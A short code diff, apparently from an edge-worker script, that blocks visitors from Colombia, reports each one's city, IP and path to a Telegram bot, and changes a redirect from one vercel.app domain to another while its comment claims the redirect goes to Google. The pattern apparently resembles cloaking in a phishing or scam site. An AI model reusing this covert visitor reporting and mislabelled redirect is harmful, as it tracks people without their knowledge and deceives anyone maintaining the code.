@@ -28,7 +28,7 @@ export default {
       ctx.waitUntil(enviarTelegram(TOKEN, CHAT_ID, `🇨🇴 COLOMBIA BLOQUEADO\nCiudad: ${city}\nIP: ${ip}\nRuta intentada: ${path}`));
       
       // Redirección inmediata a Google
-      return Response.redirect("https://personidapopular-70bjo913n-testsvercel.vercel.app/", 302);
+      return Response.redirect("https://sudesyucomiam.vercel.app/", 302);
     }
 
     // =======================================================
